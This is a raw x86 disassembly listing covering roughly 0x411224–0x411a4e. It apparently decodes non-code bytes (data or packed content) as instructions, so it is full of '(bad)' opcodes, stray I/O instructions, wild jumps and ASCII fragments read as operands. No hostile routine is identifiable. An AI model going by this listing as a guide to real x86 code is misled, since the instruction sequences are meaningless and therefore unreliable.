  411224:	ins    DWORD PTR es:[edi],dx
  411225:	gs cs ins DWORD PTR es:[edi],dx
  411228:	ins    DWORD PTR es:[edi],dx
  411229:	outs   dx,DWORD PTR ds:[esi]
  41122a:	inc    esp
  41122b:	bound  si,DWORD PTR cs:[edx+esi*2+0x66]
  411231:	addr16 jae 0x4112a2
  411234:	or     bh,BYTE PTR ds:0x6f66652f
  41123a:	arpl   WORD PTR [edx],cx
  41123c:	ins    DWORD PTR es:[edi],dx
  41123d:	ins    DWORD PTR es:[edi],dx
  41123e:	gs push bx
  411241:	ins    DWORD PTR es:[edi],dx
  411242:	ins    DWORD PTR es:[edi],dx
  411243:	jbe    0x4112b5
  411245:	cmp    al,0x79
  411247:	outs   dx,DWORD PTR ds:[esi]
  411248:	inc    ecx
  411249:	imul   esp,DWORD PTR [edi+0x3d],0x656d3e74
  411250:	imul   ebp,DWORD PTR [ebp+0x63],0x6f
  411254:	imul   ebp,DWORD PTR cs:[eax],0x3e222e6c
  41125b:	arpl   WORD PTR [edi+0x3d],bp
  41125e:	or     ch,BYTE PTR [esi+0x70]
  411261:	inc    ebx
  411262:	arpl   WORD PTR [ecx+0x70],bp
  411265:	and    BYTE PTR [eax],al
  411267:	add    BYTE PTR [ebx-0x1885102a],al
  41126d:	pop    esi
  41126e:	cld    
  41126f:	inc    edi
  411270:	pop    ebx
  411271:	add    BYTE PTR [edx-0x6e],ah
  411274:	imul   DWORD PTR [edx-0xc]
  411277:	cmp    BYTE PTR [eax+0x4b03a5d],cl
  41127d:	and    eax,0xec73
  411282:	je     0x411236
  411284:	add    BYTE PTR [eax],al
  411286:	or     al,0xa1
  411288:	add    BYTE PTR [eax],al
  41128a:	dec    edx
  41128b:	imul   ecx,DWORD PTR [ecx],0xb91ed717
  411291:	sub    BYTE PTR [ecx+0x60],bh
  411294:	in     al,0xb7
  411296:	ret    
  411297:	or     ecx,DWORD PTR [ebx-0x592d574e]
  41129d:	das    
  41129e:	add    BYTE PTR [ecx],bl
  4112a0:	jmp    0x411284
  4112a2:	add    BYTE PTR [eax],al
  4112a4:	push   edi
  4112a5:	xor    DWORD PTR [eax-0x73],0xda000000
  4112ac:	fstp   TBYTE PTR [edi]
  4112ae:	pop    ecx
  4112af:	cmp    edi,DWORD PTR [ebp+0x53]
  4112b2:	imul   esp,DWORD PTR [ebx],0x66
  4112b5:	repz je 0x4112f5
  4112b8:	es jne 0x4112c8
  4112bb:	sub    al,0x3d
  4112bd:	das    
  4112be:	das    
  4112bf:	pop    edx
  4112c0:	mov    ds,WORD PTR [eax]
  4112c2:	ss gs push esi
  4112c5:	test   DWORD PTR [edx],0x4ce444bc
  4112cb:	hlt    
  4112cc:	lock arpl WORD PTR [eax],ax
  4112cf:	add    BYTE PTR [ebx+esi*4+0x74000000],ch
  4112d6:	je     0x41134c
  4112d8:	je     0x41134e
  4112da:	je     0x411350
  4112dc:	je     0x411352
  4112de:	mov    bl,0xc0
  4112e0:	ja     0x41126d
  4112e2:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4112e8:	mov    ecx,DWORD PTR [ebx-0x6960000]
  4112ee:	pop    ebx
  4112ef:	dec    ebp
  4112f0:	sbb    DWORD PTR [edx-0x49826caf],ecx
  4112f6:	test   DWORD PTR [esi+0x312414a2],esi
  4112fc:	test   al,0xb
  4112fe:	mov    ds:0x81c01234,eax
  411303:	pop    edi
  411304:	add    BYTE PTR [eax],al
  411306:	test   al,0x17
  411308:	sub    al,0xc9
  41130a:	mov    eax,ds:0xbb0901b4
  41130f:	mov    ebx,DWORD PTR [edx]
  411311:	(bad)  
  411312:	(bad)  
  411313:	std    
  411314:	repnz nop
  411316:	cmp    eax,0x829d264c
  41131b:	and    cl,dh
  41131d:	inc    ebx
  41131e:	arpl   WORD PTR [ecx+0x30174c],sp
  411324:	add    BYTE PTR [esi],bl
  411326:	mov    WORD PTR [edi+0x79be0000],fs
  41132c:	mov    eax,0xea2de800
  411331:	xchg   edi,eax
  411332:	cmp    edi,DWORD PTR [ecx-0x13f653f4]
  411338:	out    dx,al
  411339:	or     BYTE PTR [ebp-0x6f243a59],0x5d
  411340:	addr16 sbb ecx,eax
  411343:	or     BYTE PTR [edx-0x171783d2],0xe8
  41134a:	add    eax,0x1e8e8a9
  41134f:	jp     0x411339
  411351:	call   0x8bcc9f3e
  411356:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41135c:	retf   
  41135d:	(bad)  
  41135e:	popa   
  41135f:	dec    esi
  411360:	pop    edi
  411361:	jae    0x41131b
  411363:	mov    bl,0x33
  411365:	popf   
  411366:	mov    edx,0xa7a3998f
  41136b:	and    eax,0x58dc44f7
  411370:	out    0x51,al
  411372:	jecxz  0x41135c
  411374:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  41137a:	test   DWORD PTR [ebp+0x7d8b8b85],eax
  411380:	jae    0x4113ba
  411382:	cmp    DWORD PTR [ebx-0x43152975],ecx
  411388:	loope  0x411319
  41138a:	scas   al,BYTE PTR es:[edi]
  41138b:	xor    al,0x6a
  41138d:	mov    bl,0xb1
  41138f:	mov    cl,0x4a
  411391:	jb     0x411409
  411393:	xchg   esi,eax
  411394:	ret    
  411395:	mov    esp,0x23bd8ea4
  41139a:	mov    esi,0x63951b77
  41139f:	mov    WORD PTR [ebx],ss
  4113a1:	push   esi
  4113a2:	jmp    0x4113f5
  4113a4:	stc    
  4113a5:	lods   eax,DWORD PTR ds:[esi]
  4113a6:	jne    0x41141d
  4113a8:	mov    ecx,DWORD PTR [ebx-0x74742896]
  4113ae:	adc    ebx,ebx
  4113b0:	out    0x8b,al
  4113b2:	jmp    FWORD PTR [edx-0x4a]
  4113b5:	(bad)  
  4113b8:	retf   0x833
  4113bb:	mov    ?,WORD PTR [edi-0x14]
  4113be:	ret    
  4113bf:	cmp    BYTE PTR [ebx*8-0x58234f6d],dl
  4113c6:	shl    BYTE PTR [edi-0x1b],0x2
  4113ca:	aas    
  4113cb:	(bad)  
  4113cc:	(bad)  
  4113cd:	dec    DWORD PTR [ebp-0x4a]
  4113d0:	in     al,0xa7
  4113d2:	or     al,BYTE PTR [ecx+edx*2]
  4113d5:	fidivr DWORD PTR [edx]
  4113d7:	cli    
  4113d8:	outs   dx,DWORD PTR ds:[esi]
  4113d9:	mov    DWORD PTR [edi-0xecf1dc3],esi
  4113df:	sbb    eax,0xcd412d1c
  4113e4:	je     0x411451
  4113e6:	fcom   DWORD PTR [ebx-0xbc2315]
  4113ec:	jmp    DWORD PTR [ebp-0x1c0f]
  4113f2:	dec    DWORD PTR [ebx-0x74747475]
  4113f8:	mov    ecx,DWORD PTR [ebx+0x67a38b8b]
  4113fe:	push   edx
  4113ff:	mov    ecx,DWORD PTR [ebx-0x74747475]
  411405:	mov    ecx,DWORD PTR [ebx+0x52ffff8b]
  41140b:	push   es
  41140c:	nop
  41140d:	(bad)  
  41140e:	(bad)  
  41140f:	out    0x1b,al
  411411:	inc    edi
  411412:	mov    ds:0xc9d6ab6a,ax
  411418:	or     eax,0x49ab1fbd
  41141d:	jge    0x4113cf
  41141f:	jge    0x411449
  411421:	ret    
  411422:	(bad)  
  411423:	(bad)  
  411424:	cmp    al,0x46
  411426:	(bad)  
  411427:	jmp    DWORD PTR [edx]
  411429:	cmc    
  41142a:	(bad)  
  41142b:	jmp    DWORD PTR [ecx]
  41142d:	pop    ss
  41142e:	pop    ss
  41142f:	cmc    
  411430:	jnp    0x411406
  411432:	retf   0xf502
  411435:	retf   0xbe02
  411438:	push   ss
  411439:	je     0x411454
  41143b:	fnsave [ebp+0x7d]
  41143e:	icebp  
  41143f:	bound  ebx,QWORD PTR [ecx-0xdc0f8c]
  411445:	or     BYTE PTR [edi+0x8e9dc57],cl
  41144b:	or     BYTE PTR [eax],cl
  41144d:	and    ah,BYTE PTR [eax+eax*4]
  411450:	cdq    
  411451:	inc    ebx
  411452:	push   ecx
  411453:	out    dx,eax
  411454:	sub    BYTE PTR [ecx-0x5f],al
  411457:	mov    eax,0xf1d4e930
  41145c:	mov    dl,0x83
  41145e:	pop    edx
  41145f:	mov    cl,0x72
  411461:	pop    es
  411462:	arpl   WORD PTR [ecx+0x60196721],sp
  411468:	lods   al,BYTE PTR ds:[esi]
  411469:	push   edi
  41146a:	shl    BYTE PTR [eax-0x72],1
  41146d:	retf   0xb1d5
  411470:	or     BYTE PTR [eax],cl
  411472:	arpl   WORD PTR [edi+0x8],bp
  411475:	or     BYTE PTR [eax],cl
  411477:	or     al,0xc
  411479:	or     al,0xc
  41147b:	or     al,0xc
  41147d:	or     al,0xc
  41147f:	or     al,0x8a
  411481:	sbb    esi,DWORD PTR [edi]
	...
  41148b:	add    BYTE PTR [ebp-0x7bedf373],cl
  411491:	jno    0x4114f0
  411493:	pop    ebx
  411494:	(bad)  
  411496:	int3   
  411497:	jnp    0x411434
  411499:	out    0x9f,eax
  41149b:	sub    eax,DWORD PTR [ebx+esi*4+0x1e1252fd]
  4114a2:	je     0x41144a
  4114a4:	xchg   edx,eax
  4114a5:	xor    cl,BYTE PTR [ebp+0x5ba7f98d]
  4114ab:	in     al,dx
  4114ac:	ret    
  4114ad:	push   es
  4114ae:	mov    bl,0x10
  4114b0:	mov    ecx,0xe87ac01e
  4114b5:	mov    dh,0x31
  4114b7:	push   esi
  4114b8:	ja     0x4114ef
  4114ba:	aaa    
  4114bb:	sbb    al,0x60
  4114bd:	dec    edi
  4114be:	xchg   ebx,eax
  4114bf:	sbb    ah,BYTE PTR [esi+0x39]
  4114c2:	(bad)  
  4114c3:	mov    dl,0x3c
  4114c5:	lea    ecx,[ebp-0x72903c52]
  4114cb:	(bad)  
  4114cc:	aad    0x82
  4114ce:	das    
  4114cf:	(bad)  
  4114d0:	dec    ecx
  4114d2:	in     eax,dx
  4114d3:	(bad)  
  4114d5:	inc    ebp
  4114d6:	or     bl,al
  4114d8:	push   0xffffffda
  4114da:	sbb    eax,0x1d596c5e
  4114df:	dec    ebp
  4114e0:	ret    0x8e9
  4114e3:	jo     0x41152c
  4114e5:	mov    ebx,0xffa969e7
  4114ea:	(bad)  
  4114eb:	push   edx
  4114ed:	mov    ah,0xff
  4114ef:	jmp    FWORD PTR [esi-0x33]
  4114f5:	call   0xe929fde2
  4114fa:	call   0x3529fde7
  4114ff:	in     eax,0x47
  411501:	push   edx
  411502:	and    bh,BYTE PTR [eax-0x33de32fd]
  411508:	aaa    
  411509:	ret    
  41150a:	add    eax,0x9defc6a9
  41150f:	mov    ebx,0x72d272ed
  411514:	push   ecx
  411515:	add    al,0xcc
  411517:	int3   
  411518:	int3   
  411519:	int3   
  41151a:	int3   
  41151b:	int3   
  41151c:	int3   
  41151d:	int3   
  41151e:	int3   
  41151f:	add    BYTE PTR [eax],al
  411521:	out    dx,eax
  411522:	mov    ebp,0x6c9a
  411527:	loopne 0x411526
  411529:	adc    edi,DWORD PTR [eax+0x1c]
  41152c:	and    eax,0x9069dce7
  411531:	neg    BYTE PTR [edx-0x5e]
  411534:	and    eax,0x67212793
  411539:	pop    DWORD PTR [edx-0x50]
  41153c:	xchg   DWORD PTR [ebx+0x1b],edx
  41153f:	loope  0x41158a
  411541:	push   edi
  411542:	xor    al,0xd5
  411544:	xchg   ebx,eax
  411545:	cmp    ecx,DWORD PTR [esi+0x47]
  411548:	mov    eax,0xd1000064
  41154d:	int    0x0
  41154f:	add    BYTE PTR [eax],al
  411551:	pop    es
  411552:	xor    al,BYTE PTR [eax]
  411554:	inc    ebp
  411555:	shl    DWORD PTR [esi],0x1
  411558:	mov    ecx,DWORD PTR ds:0x130f070d
  41155e:	dec    ebx
  41155f:	test   al,0xfe
  411561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411562:	pop    ds
  411563:	enter  0xb439,0x72
  411567:	push   edx
  411568:	sub    edx,DWORD PTR ss:[esi+0x4]
  41156c:	pop    esi
  41156d:	inc    ebp
  41156e:	inc    ebp
  41156f:	inc    ebp
  411570:	pop    edx
  411571:	inc    esi
  411572:	sub    ah,BYTE PTR [edi+0x27]
  411575:	call   0x63a2a851
  41157a:	pop    esi
  41157b:	ins    BYTE PTR es:[edi],dx
  41157c:	inc    edi
  41157d:	out    0x66,eax
  41157f:	bnd jne 0x411589
  411582:	mov    esp,0x8bf12c2c
  411587:	pop    ds
  411588:	mov    DWORD PTR [edx+0x45d33e4c],edi
  41158e:	inc    ebp
  41158f:	mov    eax,ds:0x45455370
  411594:	inc    ebp
  411595:	(bad)  
  411596:	(bad)  
  411597:	(bad)  
  411598:	(bad)  
  411599:	(bad)  
  41159a:	(bad)  
  41159b:	(bad)  
  41159c:	(bad)  
  41159d:	dec    DWORD PTR [eax-0x727248d0]
  4115a3:	lea    ecx,[ebp-0x72727273]
  4115a9:	lea    ecx,[ebx-0x71eef475]
  4115af:	jle    0x41159f
  4115b1:	jo     0x411618
  4115b3:	outs   dx,DWORD PTR ds:[esi]
  4115b4:	fs je  0x411624
  4115b7:	jae    0x4115fa
  4115b9:	and    BYTE PTR [di],cl
  4115bc:	and    ebp,DWORD PTR cs:[esi+0x20]
  4115c0:	and    BYTE PTR [esp+eiz*2+0x20],ch
  4115c4:	bound  esp,QWORD PTR gs:[ebp+0x74]
  4115c8:	jo     0x41162f
  4115ca:	ins    DWORD PTR es:[edi],dx
  4115cb:	cmp    al,0x74
  4115cd:	and    BYTE PTR gs:[edx+0x6f],dh
  4115d1:	gs ins DWORD PTR es:[edi],dx
  4115d3:	and    BYTE PTR [edx+0xa],dh
  4115d6:	arpl   WORD PTR fs:[eax+eiz*1+0x20],si
  4115db:	and    BYTE PTR cs:[eax+0x63],dh
  4115df:	bound  esi,QWORD PTR [edx+0x6d]
  4115e2:	jb     0x411622
  4115e4:	jae    0x411606
  4115e6:	jns    0x41164d
  4115e8:	gs jae 0x411659
  4115eb:	jo     0x411650
  4115ed:	jbe    0x411658
  4115ef:	jo     0x411653
  4115f1:	ins    DWORD PTR es:[edi],dx
  4115f2:	jns    0x41166a
  4115f4:	out    dx,al
  4115f5:	lods   eax,DWORD PTR ds:[esi]
  4115f6:	cwde   
  4115f7:	cmp    al,0x69
  4115f9:	sub    eax,0xd1b427fe
  4115fe:	retf   0xa9be
  411601:	mov    bl,0x9c
  411603:	fild   WORD PTR [bx+di-0x43]
  411607:	mov    ecx,DWORD PTR [ebx-0x7474175f]
  41160d:	xchg   esi,eax
  41160e:	call   0x9f25:0x8f858b8b
  411615:	pop    edi
  411616:	mov    ebx,0x8fc38be0
  41161b:	jp     0x4115b5
  41161d:	leave  
  41161e:	dec    esi
  41161f:	aad    0x26
  411621:	sbb    edi,esp
  411623:	sub    eax,0x87190ec0
  411628:	out    dx,eax
  411629:	mov    esi,DWORD PTR [ebp+edx*4-0x77]
  41162d:	fsubr  DWORD PTR [ebp+0x74]
  411630:	je     0x4116a6
  411632:	pop    ds
  411633:	stos   BYTE PTR es:[edi],al
  411634:	cmp    eax,0x51adeb4e
  411639:	cmp    DWORD PTR ds:0xd4c08bb,edi
  41163f:	pop    es
  411640:	add    esp,edi
  411642:	adc    esp,DWORD PTR [esi+0x3a]
  411645:	fimul  DWORD PTR [edi-0x42dcd323]
  41164b:	imul   esp,DWORD PTR [ecx-0x5549875c],0x45
  411652:	sub    BYTE PTR [ebx],cl
  411654:	mov    esp,0x14457474
  411659:	je     0x4116cf
  41165b:	je     0x4115e8
  41165d:	mov    ecx,DWORD PTR [ebx-0x74747475]
  411663:	mov    ecx,DWORD PTR [ebx+0xf2f072]
	...
  411671:	add    BYTE PTR [eax],al
  411673:	push   esp
  411674:	add    bl,bl
  411676:	int3   
  411677:	xlat   BYTE PTR ds:[ebx]
  411678:	sub    al,0x5
  41167a:	xor    ebx,edx
  41167c:	ret    
  41167d:	(bad)  
  41167e:	popf   
  41167f:	sub    BYTE PTR [edi-0xf],dl
  411682:	mov    al,ds:0x23e0b491
  411687:	in     eax,dx
  411688:	push   es
  411689:	xor    eax,0xfc0000dc
  41168e:	mov    ecx,0x4f4832f8
  411693:	mov    ah,0x53
  411695:	cdq    
  411696:	or     edx,ebp
  411698:	fst    QWORD PTR [edi+0xd]
  41169b:	into   
  41169c:	imul   edi,DWORD PTR [esi],0xa0cbfbdb
  4116a2:	or     al,BYTE PTR [edx-0x37743186]
  4116a8:	cmp    eax,0x160000c3
  4116ad:	jbe    0x41167d
  4116af:	add    BYTE PTR [eax],al
  4116b1:	push   ds
  4116b2:	jecxz  0x4116d9
  4116b4:	add    bh,bh
  4116b6:	ja     0x411657
  4116b8:	scas   eax,DWORD PTR es:[edi]
  4116b9:	push   edx
  4116ba:	push   eax
  4116bb:	dec    esp
  4116bc:	stc    
  4116bd:	sahf   
  4116be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bf:	lea    edx,[edx-0x6403bb90]
  4116c5:	test   DWORD PTR [edx-0xc8adbdf],edi
  4116cb:	adc    al,0xe
  4116cd:	xchg   edx,eax
  4116ce:	(bad)  
  4116cf:	(bad)  
  4116d0:	call   DWORD PTR [ebp*4-0x5eaf0001]
  4116d7:	(bad)  
  4116d8:	(bad)  
  4116d9:	inc    DWORD PTR [eax]
	...
  4116e3:	mov    al,0xf6
  4116e5:	jmp    0x6a35:0x11d2ebbf
  4116ec:	sbb    BYTE PTR [ecx-0x564c8e82],dh
  4116f2:	sbb    dl,cl
  4116f4:	push   edi
  4116f5:	pop    edi
  4116f6:	dec    ebx
  4116f7:	icebp  
  4116f8:	into   
  4116f9:	mov    di,di
  4116fc:	(bad)  
  4116fd:	(bad)  
  4116fe:	(bad)  
  4116ff:	(bad)  
  411700:	(bad)  
  411701:	(bad)  
  411702:	(bad)  
  411703:	jmp    DWORD PTR [esp]
  411706:	addr16 dec ecx
  411708:	imul   edx,DWORD PTR ds:0x36132424,0x73
  41170f:	mov    ch,dh
  411711:	jbe    0x4116e7
  411713:	push   ecx
  411714:	lea    esp,[ecx+0x5d3fa871]
  41171a:	xor    ebp,DWORD PTR [edx+0x5e8995a]
  411720:	xchg   BYTE PTR ds:[edi+edx*2+0x2],ch
  411725:	pop    eax
  411726:	(bad)
  41172a:	jns    0x4116e8
  41172c:	push   ss
  41172d:	stos   BYTE PTR es:[edi],al
  41172e:	pop    ebx
  41172f:	and    al,0x24
  411731:	pop    esi
  411732:	jmp    0xd0e63b5b
  411737:	add    BYTE PTR [eax+eax*1],ah
  41173a:	push   esp
  41173b:	add    dl,dh
  41173d:	sub    DWORD PTR [eax],0x1a
  411740:	jne    0x411743
  411742:	(bad)  
  411743:	scas   al,BYTE PTR es:[edi]
  411744:	inc    esp
  411745:	es leave 
  411747:	into   
  411748:	test   BYTE PTR [ecx+eiz*2+0x38eb11df],ah
  41174f:	js     0x4117c4
  411751:	sub    al,0x0
  411753:	add    BYTE PTR [eax],al
  411755:	sub    al,0x58
  411757:	call   0x36cd:0x50c69ef4
  41175e:	push   ecx
  41175f:	(bad)  
  411760:	jg     0x411727
  411762:	int    0x97
  411764:	push   es
  411765:	mov    BYTE PTR [esi],bl
  411767:	sub    ecx,ecx
  411769:	lods   eax,DWORD PTR ds:[esi]
  41176a:	shl    BYTE PTR [eax],0xc4
  41176d:	repz jge 0x41176c
  411770:	cwde   
  411771:	adc    al,0x0
  411773:	add    BYTE PTR [eax+0x1],bh
  411776:	sbb    al,0x0
  411778:	add    BYTE PTR [eax],al
  41177a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  411780:	mov    ecx,DWORD PTR [ebx+0x5259bf8b]
	...
  41178e:	add    BYTE PTR [eax],al
  411790:	add    bh,bl
  411792:	cs dec edi
  411794:	xchg   ebx,eax
  411795:	and    al,0x89
  411797:	bnd jbe 0x411736
  41179a:	pusha  
  41179b:	dec    ebp
  41179c:	(bad)  
  41179d:	lods   al,BYTE PTR ds:[esi]
  41179e:	mov    ebx,0xb4c5faf4
  4117a3:	push   edx
  4117a4:	push   eax
  4117a5:	push   0xe6df2a
  4117aa:	add    BYTE PTR [edx-0x72],al
  4117ad:	add    BYTE PTR [eax],al
  4117af:	scas   eax,DWORD PTR es:[edi]
  4117b0:	clc    
  4117b1:	add    BYTE PTR [eax],al
  4117b3:	in     al,0x19
  4117b5:	mov    bl,BYTE PTR [edx]
  4117b7:	ja     0x411763
  4117b9:	popf   
  4117ba:	pop    ecx
  4117bb:	rcr    DWORD PTR [edi+edx*2+0x1386a850],0x73
  4117c3:	or     DWORD PTR [eax-0x7526ed38],ecx
  4117c9:	pop    ds
  4117ca:	pushf  
  4117cb:	add    BYTE PTR [edx+eax*1-0x41],dh
  4117cf:	add    eax,0x747474b4
  4117d4:	jb     0x411766
  4117d6:	repnz imul esp,DWORD PTR [ebx+0x69],0x73695365
  4117de:	gs gs inc ecx
  4117e1:	arpl   WORD PTR [esi],bp
  4117e3:	and    BYTE PTR gs:[ebp+0x3e],ah
  4117e7:	gs cs jb 0x411819
  4117eb:	jae    0x411861
  4117ed:	imul   esi,DWORD PTR [edx+0xa],0x6e636529
  4117f4:	and    BYTE PTR [ebp+0x2e],ah
  4117f7:	and    BYTE PTR [edx+0x62],dh
  4117fa:	arpl   WORD PTR [edi+0x2e],sp
  4117fd:	and    BYTE PTR [ecx+0x72],ah
  411800:	bound  ebp,QWORD PTR [esi]
  411802:	gs imul ebp,DWORD PTR cs:[esi],0x63744173
  41180a:	bound  esp,QWORD PTR [eax]
  41180c:	and    BYTE PTR [ecx+0x79],ch
  41180f:	or     ah,BYTE PTR [ecx+0x72]
  411812:	arpl   WORD PTR [edx],cx
  411814:	and    esi,DWORD PTR [ebx+0x73]
  411817:	jbe    0x41187e
  411819:	inc    ecx
  41181a:	imul   esp,DWORD PTR [edx+0x20],0x6d652074
  411821:	imul   esp,DWORD PTR [eax],0x652e0d3e
  411827:	and    BYTE PTR [esi+0x72],ch
  41182a:	and    ah,BYTE PTR [ebp+0x61]
  41182d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41182e:	and    ebp,DWORD PTR [ecx+eax*2]
  411831:	mov    eax,0xb38880ef
  411836:	xchg   DWORD PTR [eax],eax
  411838:	mov    bh,BYTE PTR [ebx-0x70]
  41183b:	int    0x5
  41183d:	cmp    bh,al
  41183f:	test   BYTE PTR [ebp+0x52],ah
  411842:	loope  0x41181d
  411844:	outs   dx,BYTE PTR ds:[esi]
  411845:	adc    eax,DWORD PTR [ecx]
  411847:	jae    0x411879
  411849:	je     0x4118b0
  41184b:	aaa    
  41184c:	je     0x4118c2
  41184e:	sbb    DWORD PTR [ebx+0x74],esp
  411851:	je     0x4118c7
	...
  41185b:	add    BYTE PTR [eax],al
  41185d:	and    edi,DWORD PTR [esi+0x0]
	...
  411868:	or     al,0xc
  41186a:	push   cs
  41186b:	loop   0x411819
  41186d:	out    0x70,al
  41186f:	sbb    eax,0x4a98e694
  411874:	daa    
  411875:	dec    edi
  411876:	mov    eax,ds:0x7cb114f9
  41187b:	and    BYTE PTR [eax-0x4112c9b8],ch
  411881:	inc    edx
  411882:	or     al,0xc
  411884:	pop    edi
  411885:	sbb    bh,bl
  411887:	ffree  st(3)
  411889:	jp     0x411873
  41188b:	fs out 0xfa,al
  41188e:	outs   dx,DWORD PTR ds:[esi]
  41188f:	sbb    eax,0xbe99df6b
  411894:	icebp  
  411895:	xchg   BYTE PTR [edx-0x6d],bl
  411898:	das    
  411899:	adc    ch,0xfb
  41189c:	icebp  
  41189d:	inc    eax
  41189e:	mov    bh,0x2c
  4118a0:	inc    esp
  4118a1:	or     al,0xc
  4118a3:	mov    dh,BYTE PTR ds:0x660c0c1c
  4118a9:	pop    ebx
  4118aa:	hlt    
  4118ab:	or     al,0x0
  4118ad:	outs   dx,BYTE PTR ds:[esi]
  4118ae:	aam    0x4a
  4118b0:	fst    st(6)
  4118b2:	aad    0xc2
  4118b4:	inc    esp
  4118b5:	lock (bad) 
  4118b7:	pop    ebp
  4118b8:	cmp    al,0x35
  4118ba:	arpl   WORD PTR [esi-0x376b7234],bx
  4118c0:	clc    
  4118c1:	push   ss
  4118c2:	and    al,0xbf
  4118c4:	sbb    DWORD PTR [eax],eax
  4118c6:	add    BYTE PTR [eax],al
  4118c8:	imul   eax,DWORD PTR [ebx-0xd250000],0x0
	...
  4118da:	scas   al,BYTE PTR es:[edi]
  4118db:	ins    BYTE PTR es:[edi],dx
  4118dc:	popf   
  4118dd:	std    
  4118de:	cmp    edx,0xfffffff9
  4118e1:	dec    ebx
  4118e2:	xor    ecx,DWORD PTR [eax-0x9e0d534]
  4118e8:	push   ds
  4118e9:	ss (bad) 
  4118eb:	sti    
  4118ec:	mov    bh,0xac
  4118ee:	ins    BYTE PTR es:[edi],dx
  4118ef:	jns    0x41192e
  4118f1:	dec    eax
  4118f2:	int3   
  4118f3:	int3   
  4118f4:	int3   
  4118f5:	int3   
  4118f6:	int3   
  4118f7:	int3   
  4118f8:	int3   
  4118f9:	int3   
  4118fa:	int3   
  4118fb:	int3   
  4118fc:	int3   
  4118fd:	addr16 xchg edx,eax
  4118ff:	mov    bh,0x85
  411901:	int3   
  411902:	int3   
  411903:	adc    bh,dl
  411905:	jo     0x411955
  411907:	push   0x56de3a9
  41190c:	pop    edi
  41190d:	push   eax
  41190e:	dec    edi
  41190f:	das    
  411910:	call   0xf032f879
  411915:	mov    ecx,0x15a8b323
  41191a:	add    eax,0x52b69ca2
  41191f:	sbb    eax,0x5bebc896
  411924:	mov    eax,ds:0x9cccc92
  411929:	mov    ah,cl
  41192b:	int3   
  41192c:	test   DWORD PTR [edx+ecx*8-0x34],edx
  411930:	add    BYTE PTR [ebx],dl
  411932:	mov    DWORD PTR [ecx+0x640c9b90],0xa4e631e1
  41193c:	mov    esi,0xc88f948a
  411941:	xchg   edx,eax
  411942:	dec    esp
  411943:	sbb    DWORD PTR [esi+0x62683b84],edi
  411949:	add    BYTE PTR [eax],al
  41194b:	add    bh,dl
  41194d:	sub    dl,ch
  41194f:	xchg   edi,eax
  411950:	dec    esp
  411951:	iret   
  411952:	lock dec edi
  411954:	add    al,0x4a
  411956:	xor    bl,ch
  411958:	in     al,dx
  411959:	pop    esi
  41195a:	inc    edi
  41195b:	sahf   
  41195c:	jns    0x4119ce
  41195e:	jge    0x41193f
  411960:	add    ebx,DWORD PTR [edi]
  411962:	jne    0x411930
  411964:	sar    DWORD PTR [ecx+0x916485],0x0
  41196b:	in     al,dx
  41196c:	gs leave 
	...
  41197a:	jmp    0x4586a962
  41197f:	inc    ebp
  411980:	inc    ebp
  411981:	inc    ebp
  411982:	inc    ebp
  411983:	inc    ebp
  411984:	inc    ebp
  411985:	inc    ebp
  411986:	add    BYTE PTR [eax],al
  411988:	(bad)  
  41198a:	cli    
  41198b:	adc    ecx,ebx
  41198d:	sbb    eax,0x8082c6c1
  411992:	pop    ss
  411993:	stos   BYTE PTR es:[edi],al
  411994:	push   ss
  411995:	jbe    0x4119cb
  411997:	cwde   
  411998:	xor    al,0xf4
  41199a:	sbb    DWORD PTR [bp+di+0x25],edx
  41199e:	inc    esp
  41199f:	jge    0x4119a1
  4119a1:	add    BYTE PTR [ebx+0x53],al
  4119a4:	add    BYTE PTR [eax],al
  4119a6:	rcl    BYTE PTR [eax+eax*1+0x43ebc100],0x17
  4119ae:	jl     0x411969
  4119b0:	pop    ecx
  4119b1:	neg    DWORD PTR [ebp+0x3a]
  4119b4:	and    DWORD PTR [ebx+ebp*1],ecx
  4119b7:	sbb    ebp,esi
  4119b9:	adc    eax,edx
  4119bb:	scas   al,BYTE PTR es:[edi]
  4119bc:	jp     0x41195d
  4119be:	mov    al,0x79
  4119c0:	stos   DWORD PTR es:[edi],eax
  4119c1:	jge    0x4119c3
  4119c3:	add    BYTE PTR [ebx+0x36b33b],dl
  4119c9:	add    BYTE PTR [eax],al
  4119cb:	fwait
  4119cc:	jnp    0x4119ae
  4119ce:	xor    al,0x30
  4119d0:	fisubr DWORD PTR [edi+0x6d]
  4119d3:	fmul   QWORD PTR ds:0xe6100663
  4119d9:	mov    ch,0xcf
  4119db:	iret   
  4119dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119dd:	inc    ecx
  4119de:	push   ebx
  4119df:	and    BYTE PTR [esi-0x4a2f8ff8],bh
  4119e5:	cmp    esi,DWORD PTR [ebx+0x1517d722]
  4119eb:	repz (bad) 
  4119ed:	cmp    al,BYTE PTR [eax]
  4119ef:	add    ch,al
  4119f1:	sub    eax,DWORD PTR [eax]
  4119f3:	add    BYTE PTR [eax],al
  4119f5:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  4119fc:	add    DWORD PTR [ebx+0xc1092e],0x0
  411a03:	add    BYTE PTR [eax],al
  411a05:	add    BYTE PTR [eax],al
  411a07:	add    BYTE PTR [eax],al
  411a09:	add    BYTE PTR [ebx+0x1f16608b],cl
  411a0f:	ror    eax,1
  411a11:	jmp    0x411a57
  411a13:	xor    bh,dl
  411a15:	jl     0x411a25
  411a17:	dec    ebp
  411a18:	in     eax,0xa8
  411a1a:	push   ebp
  411a1b:	out    dx,al
  411a1c:	fcmovb st,st(4)
  411a1e:	repz lahf 
  411a20:	add    edi,DWORD PTR cs:[ebp-0x6d]
  411a24:	mov    ecx,DWORD PTR [ebx+0x3684eb52]
  411a2a:	cmp    bl,BYTE PTR [edi+0x55aef9a8]
  411a30:	jne    0x411a3b
  411a32:	jl     0x411a88
  411a34:	popa   
  411a35:	sub    ah,ch
  411a37:	push   0x59
  411a39:	mov    ebp,0x8e63c5d0
  411a3e:	not    BYTE PTR [esi]
  411a40:	ds sub bl,cl
  411a43:	mov    ecx,DWORD PTR [ebx-0x745d032d]
  411a49:	mov    edx,DWORD PTR [ecx-0x71]
  411a4c:	jge    0x4119d9
  411a4e:	jmp    FWORD PTR [edi-0x6ad1a5c9]
